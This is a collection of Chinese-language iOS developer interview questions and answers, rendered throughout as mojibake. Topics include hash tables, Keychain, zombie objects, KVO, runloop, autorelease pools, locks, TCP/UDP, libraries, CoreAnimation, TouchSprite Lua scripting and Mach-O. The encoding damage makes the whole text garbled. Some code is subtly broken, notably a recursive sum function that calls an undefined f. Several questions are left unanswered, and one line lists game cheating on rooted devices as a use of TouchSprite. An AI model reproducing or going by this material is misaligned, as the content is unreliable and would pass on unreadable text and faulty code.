·åšçš„å¼Šç«¯åœ¨äºå–ä½™æ‰€å¾—åˆ°çš„å€¼ï¼Œå¯èƒ½æ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´å®Œå…¨ä¸ç›¸å¹²çš„é”®å€¼å¯¹è¢«æ–°çš„é”®å€¼å¯¹ï¼ˆå–ä½™åå€¼keyç›¸ç­‰ï¼‰æ‰€è¦†ç›–ï¼Œäºæ˜¯å‡ºç°äº†æ•°ç»„ä¸­å¥—é“¾è¡¨å®ç°çš„æ•°ç»„ã€‚è¿™æ ·ï¼Œkeyå€¼å–ä½™å¾—åˆ°å€¼ç›¸ç­‰çš„é”®å€¼å¯¹ï¼Œéƒ½å°†ä¿å­˜åœ¨åŒä¸€ä¸ªé“¾è¡¨æ•°ç»„ä¸­ï¼Œå½“æŸ¥æ‰¾keyå¯¹åº”çš„å€¼æ—¶ï¼Œé¦–å…ˆè·å–åˆ°è¯¥é“¾è¡¨æ•°ç»„ï¼Œç„¶åéå†æ•°ç»„ï¼Œå–æ­£ç¡®çš„keyæ‰€å¯¹åº”çš„å€¼å³å¯ã€‚

8ã€ä½ ä»¬çš„Appæ˜¯å¦‚ä½•å¤„ç†æœ¬åœ°æ•°æ®å®‰å…¨çš„ï¼ˆæ¯”å¦‚ç”¨æˆ·åçš„å¯†ç ï¼‰ï¼Ÿ
Keychainæ˜¯iOSæ‰€æä¾›çš„ä¸€ç§å®‰å…¨å­˜å‚¨å‚æ•°çš„æ–¹å¼ï¼Œæœ€å¸¸ç”¨æ¥å­˜å‚¨è´¦å·ï¼Œå¯†ç ï¼Œç”¨æˆ·ä¿¡æ¯ï¼Œé“¶è¡Œå¡èµ„æ–™ç­‰ä¿¡æ¯ï¼ŒKeychainä¼šä»¥åŠ å¯†çš„æ–¹å¼å­˜å‚¨åœ¨è®¾å¤‡ä¸­

9ã€é‡åˆ°è¿‡BAD_ACCESSçš„é”™è¯¯å—ï¼Ÿä½ æ˜¯æ€æ ·è°ƒè¯•çš„ï¼Ÿ
å‘ä¸€ä¸ªå·²ç»é‡Šæ”¾çš„å¯¹è±¡å‘é€æ¶ˆæ¯ é‡æŒ‡é’ˆ

åƒµå°¸å¯¹è±¡åœ¨è®¸å¤šæƒ…å†µä¸‹è§£å†³è¿™ä¸ªé—®é¢˜ã€‚é€šè¿‡ä¿ç•™å·²é‡Šæ”¾çš„å¯¹è±¡ï¼ŒXcodeå¯ä»¥å‘Šè¯‰ä½ ä½ è¯•å›¾è®¿é—®å“ªä¸ªå¯¹è±¡ï¼Œè¿™ä½¿çš„æŸ¥æ‰¾é—®é¢˜åŸå› å®¹æ˜“å¾—å¤š
é€‰ä¸­Edit Schemeã€‚åœ¨å·¦ä¾§é€‰ä¸­Run ï¼Œåœ¨ä¸Šæ–¹æ‰“å¼€ Diagnosticsé€‰é¡¹ã€‚è¦å¯ç”¨åƒµå°¸å¯¹è±¡ï¼Œå‹¾é€‰ Zombie Objectsé€‰æ¡†ã€‚

10ã€ä»€ä¹ˆæ˜¯æŒ‡é’ˆå¸¸é‡å’Œå¸¸é‡æŒ‡é’ˆï¼Ÿ
â€œå¸¸é‡æŒ‡é’ˆæ˜¯æŒ‡--æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆ,é¡¾åæ€ä¹‰,å°±æ˜¯æŒ‡é’ˆæŒ‡å‘çš„æ˜¯å¸¸é‡,å³,å®ƒä¸èƒ½æŒ‡å‘å˜é‡,å®ƒæŒ‡å‘çš„å†…å®¹ä¸èƒ½è¢«æ”¹å˜,ä¸èƒ½é€šè¿‡æŒ‡é’ˆæ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„å†…å®¹,ä½†æ˜¯æŒ‡é’ˆè‡ªèº«ä¸æ˜¯å¸¸é‡,å®ƒè‡ªèº«çš„å€¼å¯ä»¥æ”¹å˜,ä»è€Œå¯ä»¥æŒ‡å‘å¦ä¸€ä¸ªå¸¸é‡ã€‚ 
æŒ‡é’ˆå¸¸é‡æ˜¯æŒ‡--æŒ‡é’ˆæœ¬èº«æ˜¯å¸¸é‡

11ã€ä¸å€Ÿç”¨ç¬¬ä¸‰ä¸ªå˜é‡ï¼Œå¦‚ä½•äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ï¼Ÿè¦æ±‚æ‰‹åŠ¨å†™å‡ºäº¤æ¢è¿‡ç¨‹ã€‚
a = a + b;
b = a - b; // b = (a +b)-b,å³ b = a
a = a - b; // a = (a+b)-a


12ã€è‹¥ä½ å»è®¾è®¡ä¸€ä¸ªé€šçŸ¥ä¸­å¿ƒï¼Œä½ ä¼šæ€æ ·è®¾è®¡ï¼Ÿ

13ã€å¦‚ä½•å»è®¾è®¡ä¸€ä¸ªæ–¹æ¡ˆå»åº”å¯¹åç«¯é¢‘ç¹æ›´æ”¹çš„å­—æ®µæ¥å£ï¼Ÿ



14ã€KVOã€KVCçš„å®ç°åŸç†
ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«è§‚å¯Ÿæ—¶ç³»ç»ŸåŠ¨æ€åˆ›å»ºäº†ä¸€ä¸ªå­ç±»ï¼Œå¹¶ä¸”æ”¹å˜äº†åŸæœ‰å¯¹è±¡çš„isaæŒ‡é’ˆæŒ‡å‘ï¼ŒæŒ‡å‘åŠ¨æ€åˆ›å»ºçš„å­ç±»ï¼Œå­ç±»ä¸­é‡å†™äº†è¢«è§‚å¯Ÿå±æ€§çš„setæ–¹æ³•ï¼Œåœ¨ä½¿ç”¨ç‚¹æ–¹æ³•å’Œsetæ–¹æ³•ç»™å±æ€§èµ‹å€¼æ—¶ï¼Œæœ€ç»ˆè°ƒç”¨çš„æ˜¯å­ç±»ä¸­çš„setæ–¹æ³•ã€‚

15ã€ç”¨é€’å½’ç®—æ³•æ±‚1åˆ°nçš„å’Œ
int add100(int n) {
    //å®šä¹‰å‡½æ•°f å‡ºå£ä¸ºnç­‰äº1ï¼Œå¦åˆ™å°†nä¸f(n-1)ç›¸åŠ 
    if(n == 1) {//å‡ºå£
        return(1);
    }else{//é€’å½’å…¬å¼
        return(f(n-1) + n);
    }
}



16ã€categoryä¸ºä»€ä¹ˆä¸èƒ½æ·»åŠ å±æ€§ï¼Ÿ
åœ¨åˆ†ç±»é‡Œä½¿ç”¨@propertyå£°æ˜å±æ€§ï¼Œåªæ˜¯å°†è¯¥å±æ€§æ·»åŠ åˆ°è¯¥ç±»çš„å±æ€§åˆ—è¡¨ï¼Œä½†æ˜¯æ²¡æœ‰ç”Ÿæˆç›¸åº”çš„æˆå‘˜å˜é‡ï¼Œä¹Ÿæ²¡æœ‰å®ç°setterå’Œgetteræ–¹æ³•ã€‚


17ã€è¯´ä¸€ä¸‹runloopå’Œçº¿ç¨‹çš„å…³ç³»ã€‚
çº¿ç¨‹å’Œ RunLoop ä¹‹é—´æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå…¶å…³ç³»æ˜¯ä¿å­˜åœ¨ä¸€ä¸ªå…¨å±€çš„ Dictionary é‡Œã€‚
çº¿ç¨‹åˆšåˆ›å»ºæ—¶å¹¶æ²¡æœ‰ RunLoopï¼Œå¦‚æœä½ ä¸ä¸»åŠ¨è·å–ï¼Œé‚£å®ƒä¸€ç›´éƒ½ä¸ä¼šæœ‰ã€‚
RunLoop çš„åˆ›å»ºæ˜¯å‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡è·å–æ—¶ï¼ŒRunLoop çš„é”€æ¯æ˜¯å‘ç”Ÿåœ¨çº¿ç¨‹ç»“æŸæ—¶ã€‚
ä½ åªèƒ½åœ¨ä¸€ä¸ªçº¿ç¨‹çš„å†…éƒ¨è·å–å…¶ RunLoopï¼ˆä¸»çº¿ç¨‹é™¤å¤–ï¼‰ã€‚



18ã€è¯´ä¸€ä¸‹autoreleasePoolçš„å®ç°åŸç†ã€‚
ä¸€ä¸ªçº¿ç¨‹çš„autoreleasepoolå°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ ˆã€‚
æ ˆä¸­å­˜æ”¾çš„æŒ‡é’ˆæŒ‡å‘åŠ å…¥éœ€è¦releaseçš„å¯¹è±¡æˆ–è€…POOL_SENTINELï¼ˆå“¨å…µå¯¹è±¡ï¼Œç”¨äºåˆ†éš”autoreleasepoolï¼‰ã€‚
æ ˆä¸­æŒ‡å‘POOL_SENTINELçš„æŒ‡é’ˆå°±æ˜¯autoreleasepoolçš„ä¸€ä¸ªæ ‡è®°ã€‚
å½“autoreleasepoolè¿›è¡Œå‡ºæ ˆæ“ä½œï¼Œæ¯ä¸€ä¸ªæ¯”è¿™ä¸ªå“¨å…µå¯¹è±¡åè¿›æ ˆçš„å¯¹è±¡éƒ½ä¼šreleaseã€‚
è¿™ä¸ªæ ˆæ˜¯ç”±ä¸€ä¸ªä»¥pageä¸ºèŠ‚ç‚¹åŒå‘é“¾è¡¨ç»„æˆï¼Œpageæ ¹æ®éœ€æ±‚è¿›è¡Œå¢å‡ã€‚
autoreleasepoolå¯¹åº”çš„çº¿ç¨‹å­˜å‚¨äº†æŒ‡å‘æœ€æ–°pageï¼ˆä¹Ÿå°±æ˜¯æœ€æ–°æ·»åŠ autoreleaseå¯¹è±¡çš„pageï¼‰çš„æŒ‡é’ˆã€‚



19ã€è¯´ä¸€ä¸‹ç®€å•å·¥å‚æ¨¡å¼ï¼Œå·¥å‚æ¨¡å¼ä»¥åŠæŠ½è±¡å·¥å‚æ¨¡å¼ï¼Ÿ
20ã€å¦‚ä½•è®¾è®¡ä¸€ä¸ªç½‘ç»œè¯·æ±‚åº“ï¼Ÿ
21ã€è¯´ä¸€ä¸‹å¤šçº¿ç¨‹ï¼Œä½ å¹³å¸¸æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ


22ã€è¯´ä¸€ä¸‹UITableViewCellçš„å¡é¡¿ä½ æ˜¯æ€ä¹ˆä¼˜åŒ–çš„ï¼Ÿ
1.æå‰è®¡ç®—å¹¶ç¼“å­˜å¥½é«˜åº¦ï¼Œå› ä¸ºheightForRowæœ€é¢‘ç¹çš„è°ƒç”¨ã€‚

2.å¼‚æ­¥ç»˜åˆ¶ï¼Œé‡åˆ°å¤æ‚ç•Œé¢ï¼Œæ€§èƒ½ç“¶é¢ˆæ—¶ï¼Œå¯èƒ½æ˜¯çªç ´å£ã€‚

3.æ»‘åŠ¨æ—¶æŒ‰éœ€åŠ è½½ï¼Œè¿™ä¸ªåœ¨å¤§é‡å›¾ç‰‡å±•ç¤ºï¼Œç½‘ç»œåŠ è½½æ—¶ï¼Œå¾ˆç®¡ç”¨ã€‚ï¼ˆSDWebImageå·²ç»å®ç°å¼‚æ­¥åŠ è½½ï¼‰ã€‚

4.é‡ç”¨cellsã€‚

5.å¦‚æœcellå†…æ˜¾ç¤ºå¾—å†…å®¹æ¥è‡ªwebï¼Œä½¿ç”¨å¼‚æ­¥åŠ è½½ï¼Œç¼“å­˜ç»“æœè¯·æ±‚ã€‚

6.å°‘ç”¨æˆ–ä¸ç”¨é€æ˜å›¾å±‚ï¼Œä½¿ç”¨ä¸é€æ˜è§†å›¾ã€‚

7.å°½é‡ä½¿æ‰€æœ‰çš„view opaqueï¼ŒåŒ…æ‹¬cellæœ¬èº«ã€‚

8.å‡å°‘subViews

9.å°‘ç”¨addViewç»™cellåŠ¨æ€æ·»åŠ viewï¼Œå¯ä»¥åˆå§‹åŒ–çš„æ—¶å€™å°±æ·»åŠ ï¼Œç„¶åé€šè¿‡hideæ§åˆ¶æ˜¯å¦æ˜¾ç¤ºã€‚


23ã€çœ‹è¿‡å“ªäº›ä¸‰æ–¹åº“ï¼Ÿè¯´ä¸€ä¸‹å®ç°åŸç†ä»¥åŠå¥½åœ¨å“ªé‡Œï¼Ÿ
24ã€è¯´ä¸€ä¸‹HTTPåè®®ä»¥åŠç»å¸¸ä½¿ç”¨çš„codeç çš„å«ä¹‰ã€‚
404 403 500 502


25ã€è®¾è®¡ä¸€å¥—ç¼“å­˜ç­–ç•¥ã€‚
26ã€è®¾è®¡ä¸€ä¸ªæ£€æµ‹ä¸»çº¿å’Œå¡é¡¿çš„æ–¹æ¡ˆã€‚


27ã€è¯´ä¸€ä¸‹runtimeï¼Œå·¥ä½œæ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿçœ‹è¿‡runtimeæºç å—ï¼Ÿ
struct isaæŒ‡é’ˆ 

28ã€è¯´å‡ ä¸ªä½ åœ¨å·¥ä½œä¸­ä½¿ç”¨åˆ°çš„çº¿ç¨‹å®‰å…¨çš„ä¾‹å­
@property (atomic, strong)
@synchronized(token)
NSLock
dispatch_semaphore_t

29ã€ç”¨è¿‡å“ªäº›é”ï¼Ÿå“ªäº›é”çš„æ€§èƒ½æ¯”è¾ƒé«˜ï¼Ÿ
å¤šçº¿ç¨‹ç¼–ç¨‹æ—¶ï¼Œæ²¡æœ‰é”çš„æƒ…å†µ == çº¿ç¨‹ä¸å®‰å…¨ã€‚
é€’å½’é”/@synchronized/os_unfair_lock:(äº’æ–¥é”)/æ¡ä»¶é”NSCondition/dispatch_semaphore

30ã€è¯´ä¸€ä¸‹HTTPå’ŒHTTPsçš„è¯·æ±‚è¿‡ç¨‹ï¼Ÿ

31ã€è¯´ä¸€ä¸‹TCPå’ŒUDP
UDP ä¸ TCP çš„ä¸»è¦åŒºåˆ«åœ¨äº UDP ä¸ä¸€å®šæä¾›å¯é çš„æ•°æ®ä¼ è¾“ã€‚

1ã€TCPé¢å‘è¿æ¥ï¼ˆå¦‚æ‰“ç”µè¯è¦å…ˆæ‹¨å·å»ºç«‹è¿æ¥ï¼‰;UDPæ˜¯æ— è¿æ¥çš„ï¼Œå³å‘é€æ•°æ®ä¹‹å‰ä¸éœ€è¦å»ºç«‹è¿æ¥

2ã€TCPæä¾›å¯é çš„æœåŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡TCPè¿æ¥ä¼ é€çš„æ•°æ®ï¼Œæ— å·®é”™ï¼Œä¸ä¸¢å¤±ï¼Œä¸é‡å¤ï¼Œä¸”æŒ‰åºåˆ°è¾¾;UDPå°½æœ€å¤§åŠªåŠ›äº¤ä»˜ï¼Œå³ä¸ä¿è¯å¯é äº¤ä»˜

3ã€TCPé¢å‘å­—èŠ‚æµï¼Œå®é™…ä¸Šæ˜¯TCPæŠŠæ•°æ®çœ‹æˆä¸€è¿ä¸²æ— ç»“æ„çš„å­—èŠ‚æµ;UDPæ˜¯é¢å‘æŠ¥æ–‡çš„UDPæ²¡æœ‰æ‹¥å¡æ§åˆ¶ï¼Œå› æ­¤ç½‘ç»œå‡ºç°æ‹¥å¡ä¸ä¼šä½¿æºä¸»æœºçš„å‘é€é€Ÿç‡é™ä½ï¼ˆå¯¹å®æ—¶åº”ç”¨å¾ˆæœ‰ç”¨ï¼Œå¦‚IPç”µè¯ï¼Œå®æ—¶è§†é¢‘ä¼šè®®ç­‰ï¼‰

4ã€æ¯ä¸€æ¡TCPè¿æ¥åªèƒ½æ˜¯ç‚¹åˆ°ç‚¹çš„;UDPæ”¯æŒä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡

5ã€TCPé¦–éƒ¨å¼€é”€20å­—èŠ‚;UDPçš„é¦–éƒ¨å¼€é”€å°ï¼Œåªæœ‰8ä¸ªå­—èŠ‚6ã€TCPçš„é€»è¾‘é€šä¿¡ä¿¡é“æ˜¯å…¨åŒå·¥çš„å¯é ä¿¡é“ï¼ŒUDPåˆ™æ˜¯ä¸å¯é ä¿¡é“



32ã€è¯´ä¸€ä¸‹é™æ€åº“å’ŒåŠ¨æ€åº“ä¹‹é—´çš„åŒºåˆ«
 é™æ€åº“: é™æ€åº“æ˜¯åœ¨ç¼–è¯‘æ—¶,å®Œæ•´çš„æ‹·è´è‡³å¯æ‰§è¡Œæ–‡ä»¶ä¸­,è¢«å¤šæ¬¡ä½¿ç”¨å°±æœ‰å¤šæ¬¡å†—ä½™æ‹·è´;
 åŠ¨æ€åº“: ç¨‹åºè¿è¡Œæ—¶ç”±ç³»ç»ŸåŠ¨æ€åŠ è½½åˆ°å†…å­˜,è€Œä¸æ˜¯å¤åˆ¶,ä¾›ç¨‹åºè°ƒç”¨ã€‚ç³»ç»ŸåªåŠ è½½ä¸€æ¬¡,å¤šä¸ªç¨‹åºå…±ç”¨,èŠ‚çœå†…å­˜
 é™æ€åº“ï¼šä»¥.a å’Œ .frameworkä¸ºæ–‡ä»¶åç¼€åã€‚

åŠ¨æ€åº“ï¼šä»¥.tbd(ä¹‹å‰å«.dylib) å’Œ .framework ä¸ºæ–‡ä»¶åç¼€åã€‚ï¼ˆç³»ç»Ÿç›´æ¥æä¾›ç»™æˆ‘ä»¬çš„frameworkéƒ½æ˜¯åŠ¨æ€åº“ï¼ï¼‰

ç†è§£ï¼š.a æ˜¯ä¸€ä¸ªçº¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ.framework ä¸­é™¤äº†æœ‰äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹å¤–è¿˜æœ‰èµ„æºæ–‡ä»¶ã€‚ .a ï¼Œè¦æœ‰ .h æ–‡ä»¶ä»¥åŠèµ„æºæ–‡ä»¶é…åˆï¼Œ .framework æ–‡ä»¶å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚æ€»çš„æ¥è¯´ï¼Œ.a + .h + sourceFile = .frameworkã€‚æ‰€ä»¥åˆ›å»ºé™æ€åº“æœ€å¥½è¿˜æ˜¯ç”¨.frameworkçš„å½¢å¼


 
33ã€loadå’Œinitializeæ–¹æ³•åˆ†åˆ«åœ¨ä»€ä¹ˆæ—¶å€™è°ƒç”¨çš„ï¼Ÿ
loadå’Œinitializeæ–¹æ³•éƒ½ä¼šåœ¨å®ä¾‹åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨ï¼Œä»¥mainå‡½æ•°ä¸ºåˆ†æ°´å²­ï¼Œloadåœ¨mainå‡½æ•°ä¹‹å‰è°ƒç”¨ï¼Œåè€…åœ¨ä¹‹åè°ƒç”¨ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œä¸èƒ½æ‰‹åŠ¨è°ƒç”¨å®ƒä»¬ã€‚

loadå’Œinitializeæ–¹æ³•éƒ½ä¸ç”¨æ˜¾ç¤ºçš„è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•è€Œæ˜¯è‡ªåŠ¨è°ƒç”¨ï¼Œå³ä½¿å­ç±»æ²¡æœ‰initializeæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•ï¼Œè€Œloadæ–¹æ³•åˆ™ä¸ä¼šè°ƒç”¨çˆ¶ç±»ã€‚

loadæ–¹æ³•é€šå¸¸ç”¨æ¥è¿›è¡ŒMethod Swizzleï¼Œinitializeæ–¹æ³•ä¸€èˆ¬ç”¨äºåˆå§‹åŒ–å…¨å±€å˜é‡æˆ–é™æ€å˜é‡ã€‚

loadå’Œinitializeæ–¹æ³•å†…éƒ¨ä½¿ç”¨äº†é”ï¼Œå› æ­¤å®ƒä»¬æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚å®ç°æ—¶è¦å°½å¯èƒ½ä¿æŒç®€å•ï¼Œé¿å…é˜»å¡çº¿ç¨‹ï¼Œä¸è¦å†ä½¿ç”¨é”ã€‚


34ã€NSNotificationCenteræ˜¯åœ¨å“ªä¸ªçº¿ç¨‹å‘é€çš„é€šçŸ¥ï¼Ÿ
NSNotificationCenteré€šçŸ¥ä¸­å¿ƒæ˜¯åŒæ­¥æ“ä½œ
æ¥æ”¶é€šçŸ¥å’Œå‘é€é€šçŸ¥æ—¶æ‰€åœ¨çº¿ç¨‹ä¸€è‡´ï¼Œå’Œç›‘å¬æ—¶æ‰€åœ¨çº¿ç¨‹æ— å…³ã€‚

35ã€ç”¨è¿‡swiftå—ï¼Ÿå¦‚æœæ²¡æœ‰ï¼Œå¹³å¸¸æœ‰å­¦ä¹ å—ï¼Ÿ
class struct

36ã€è¯´ä¸€ä¸‹ä½ å¯¹æ¶æ„çš„ç†è§£ï¼Ÿ
MVVM

37ã€ä¸ºä»€ä¹ˆä¸€å®šè¦åœ¨ä¸»çº¿ç¨‹é‡Œé¢æ›´æ–°UIï¼Ÿ
  a. UIKitå¹¶ä¸æ˜¯ä¸€ä¸ª çº¿ç¨‹å®‰å…¨ çš„ç±»ï¼ŒUIæ“ä½œæ¶‰åŠåˆ°æ¸²æŸ“è®¿é—®å„ç§Viewå¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœå¼‚æ­¥æ“ä½œä¸‹ä¼šå­˜åœ¨è¯»å†™é—®é¢˜ï¼Œè€Œä¸ºå…¶åŠ é”åˆ™ä¼šè€—è´¹å¤§é‡èµ„æºå¹¶æ‹–æ…¢è¿è¡Œé€Ÿåº¦ã€‚
  b. æ•´ä¸ªç¨‹åºçš„èµ·ç‚¹UIApplicationæ˜¯åœ¨ä¸»çº¿ç¨‹è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰€æœ‰çš„ç”¨æˆ·äº‹ä»¶éƒ½æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸Šè¿›è¡Œä¼ é€’ï¼ˆå¦‚ç‚¹å‡»ã€æ‹–åŠ¨ï¼‰ï¼Œæ‰€ä»¥viewåªèƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰èƒ½å¯¹äº‹ä»¶è¿›è¡Œå“åº”ã€‚
  c. æ¸²æŸ“æ–¹é¢ç”±äºå›¾åƒçš„æ¸²æŸ“éœ€è¦ä»¥60å¸§çš„åˆ·æ–°ç‡åœ¨å±å¹•ä¸ŠåŒæ—¶æ›´æ–°ï¼Œåœ¨éä¸»çº¿ç¨‹å¼‚æ­¥åŒ–çš„æƒ…å†µä¸‹æ— æ³•ç¡®å®šè¿™ä¸ªå¤„ç†è¿‡ç¨‹èƒ½å¤Ÿå®ç°åŒæ­¥æ›´æ–°ã€‚

# iOSåŠ¨ç”»
1. CoreGraphicsï¼š

å®ƒæ˜¯iOSçš„æ ¸å¿ƒå›¾å½¢åº“ï¼Œå¹³æ—¶ä½¿ç”¨æœ€é¢‘ç¹çš„pointï¼Œsizeï¼Œrectç­‰ï¼Œéƒ½å®šä¹‰åœ¨è¿™ä¸ªæ¡†æ¶ä¸­ï¼Œç±»åä»¥CGå¼€å¤´çš„éƒ½å±äºCoreGraphicsæ¡†æ¶ï¼Œå®ƒæä¾›çš„éƒ½æ˜¯Cè¯­è¨€çš„å‡½æ•°æ¥å£ï¼Œæ˜¯å¯ä»¥åœ¨iOSå’ŒmacOSé€šç”¨çš„ã€‚

2. QuartzCoreï¼š(CoreAnimation)

è¿™ä¸ªæ¡†æ¶çš„åç§°æ„Ÿè§‰ä¸æ˜¯å¾ˆæ¸…æ™°ï¼Œä¸æ˜ç¡®ï¼Œä½†æ˜¯çœ‹å®ƒçš„å¤´æ–‡ä»¶å¯ä»¥å‘ç°ï¼Œå®ƒå…¶å®å°±æ˜¯CoreAnimationï¼Œè¿™ä¸ªæ¡†æ¶çš„å¤´æ–‡ä»¶åªåŒ…å«äº†CoreAnimation.h  ç±»åä»¥CAå¼€å¤´

CABasicAnimationçš„å±æ€§
å±æ€§	       è¯´æ˜
duration	åŠ¨ç”»çš„æ—¶é•¿
repeatCount	é‡å¤çš„æ¬¡æ•°
repeatDuration	è®¾ç½®åŠ¨ç”»çš„æ—¶é—´ï¼Œåœ¨æ”¹æ—¶é—´å†…ä¸€ç›´æ‰§è¡Œï¼Œä¸è®¡ç®—æ¬¡æ•°
beginTime	æŒ‡å®šåŠ¨ç”»å¼€å§‹æ—¶é—´
timingFunction	è®¾ç½®åŠ¨ç”»çš„é€Ÿåº¦å˜åŒ–
autoreverses	åŠ¨ç”»ç»“æŸæ˜¯å¦æ‰§è¡Œé€†åŠ¨ç”»
fromValue	å±æ€§çš„èµ·å§‹å€¼
toValue	ç»“æŸçš„å€¼
byValue	æ”¹å˜å±æ€§ç›¸åŒèµ·å§‹å€¼çš„æ”¹å˜é‡

Keypathå¸¸ç”¨çš„å±æ€§ï¼š

Keypath	                 è¯´æ˜	   ä½¿ç”¨
transform.scale	        æ¯”ä¾‹è½¬åŒ–    @(cgfloat)
transform.scale.x	å®½çš„æ¯”ä¾‹	@(cgfloat)
transform.scale.y	é«˜çš„æ¯”ä¾‹	@(cgfloat)
transform.rotation.x	å›´ç»•xè½´æ—‹è½¬	@(M_PI)
transform.rotation.y	å›´ç»•yè½´æ—‹è½¬	@(M_PI)
transform.rotation.z	å›´ç»•zè½´æ—‹è½¬	@(M_PI)
cornerRadius	        åœ†è§’çš„è®¾ç½®	@(50)
backgroundColor	        èƒŒæ™¯é¢œè‰²çš„å˜åŒ–	(id)[uicolor redcolor].cgcolor
bounds	                å¤§å°ï¼Œä¸­å¿ƒä¸å˜	[nsvalue valuewithcgrect:]
position	        ä½ç½®(ä¸­å¿ƒç‚¹çš„æ”¹å˜)	[nsvalue valuewithcgpoint]
contents	        å†…å®¹(æ¯”å¦‚å›¾ç‰‡)	(id)image.cgimage
opacity             	é€æ˜åº¦	@(cgfloat)
contentsRect.size.width	æ¨ªå‘æ‹‰ä¼¸ç¼©æ”¾(éœ€è¦è®¾ç½®contents)	@(cgfloat)

CAKeyframeAnimationè®¾ç½®åŠ¨ç”»çš„è·¯å¾„åˆ†ä¸ºä¸¤ç§

è®¾ç½®path
è®¾ç½®ä¸€ç»„çš„values

CAAnimationGroupåŠ¨ç”»ç»„
å°†å¤šä¸ªåŠ¨ç”»åˆå¹¶åˆ°ä¸€èµ·çš„åŠ¨ç”»å°±æ˜¯CAAnimationGroupåŠ¨ç”»ç»„

CATransitionè½¬åœºåŠ¨ç”»
CATransitionæ˜¯CAAnimationçš„å­ç±»ï¼Œç”¨äºè¿‡æ¸¡åŠ¨ç”»æˆ–è½¬åœºåŠ¨ç”»ã€‚ä¸ºè§†å›¾å±‚ç§»å…¥ç§»é™¤å±å¹•æä¾›è½¬åœºåŠ¨ç”»

## Lua è„šæœ¬
```
     Lua æ˜¯ä¸€ç§è½»é‡å°å·§çš„è„šæœ¬è¯­è¨€ï¼Œç”¨æ ‡å‡†Cè¯­è¨€ç¼–å†™å¹¶ä»¥æºä»£ç å½¢å¼å¼€æ”¾ï¼Œ
     å…¶è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†åµŒå…¥åº”ç”¨ç¨‹åºä¸­ï¼Œä»è€Œä¸ºåº”ç”¨ç¨‹åºæä¾›çµæ´»çš„æ‰©å±•å’Œå®šåˆ¶åŠŸèƒ½ã€‚
     
     Luaçš„åº”ç”¨åœºæ™¯ï¼š

     æ¸¸æˆå¼€å‘
     ç‹¬ç«‹åº”ç”¨è„šæœ¬
     Web åº”ç”¨è„šæœ¬
     æ‰©å±•å’Œæ•°æ®åº“æ’ä»¶å¦‚ï¼šMySQL Proxy å’Œ MySQL
     WorkBench
     å®‰å…¨ç³»ç»Ÿï¼Œå¦‚å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ


     è§¦åŠ¨ç²¾çµçš„åº”ç”¨åœºæ™¯ï¼š

     ç¼–å†™è‡ªå·±Appçš„è„šæœ¬å®Œæˆè‡ªåŠ¨åŒ–æµ‹è¯•
     å¼€æŒ‚åˆ·æœº
     å¾®ä¿¡æœºå™¨äººï¼ˆåŒ…æ‹¬å¼€å‘ä»»æ„åº”ç”¨çš„æœºå™¨äººï¼‰
     å› æ­¤æˆ‘ä»¬å¯ä»¥è½»æ˜“åšå‡ºä¸Šé¢æ•ˆæœå›¾çš„åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦ç§»åŠ¨è®¾å¤‡å¿…é¡»æ˜¯ä»¥ä¸‹å…¶ä¸€ï¼š

     (Rootæƒé™)è¶Šç‹±çš„iOSè®¾å¤‡
     Rootæƒé™çš„Androidè®¾å¤‡
     å…·æœ‰Rootæƒé™çš„Androidæ¨¡æ‹Ÿå™¨
     æé†’ï¼šAndroidä¸iOSå…¼å®¹å¤§éƒ¨åˆ†å‡½æ•°ã€‚
     æ¨¡æ‹Ÿå™¨è¿æ¥ç¼–è¾‘å™¨æ¯”è¾ƒéº»çƒ¦ï¼Œå…·ä½“æ“ä½œè¯·æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ã€‚æ¨èä½¿ç”¨å¤©å¤©æ¨¡æ‹Ÿå™¨ï¼Œå…·æœ‰åˆ«çš„æ¨¡æ‹Ÿå™¨ä¸å…·å¤‡çš„ç‰¹æ€§ã€‚
     
     
     å¼€å‘æ‰€éœ€çš„å¿…å¤‡å·¥å…·ï¼š

     å…·å¤‡windows/Macç¯å¢ƒå¼€å‘(luaå®‰è£…)
     åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šå®‰è£…è§¦åŠ¨ç²¾çµApp
     IDE è„šæœ¬ç¼–è¾‘å™¨TouchSprite Studio
     å–ç‚¹æŠ“è‰²å™¨TSColorPicker
```

## Mach-O çš„ç»„æˆç»“æ„

---- Header åŒ…å«è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸€èˆ¬ä¿¡æ¯

            å­—èŠ‚é¡ºåºã€æ¶æ„ç±»å‹ã€åŠ è½½æŒ‡ä»¤çš„æ•°é‡ç­‰ã€‚

---- Load commands ä¸€å¼ åŒ…å«å¾ˆå¤šå†…å®¹çš„è¡¨

                   å†…å®¹åŒ…æ‹¬åŒºåŸŸçš„ä½ç½®ã€ç¬¦å·è¡¨ã€åŠ¨æ€ç¬¦å·è¡¨ç­‰ã€‚

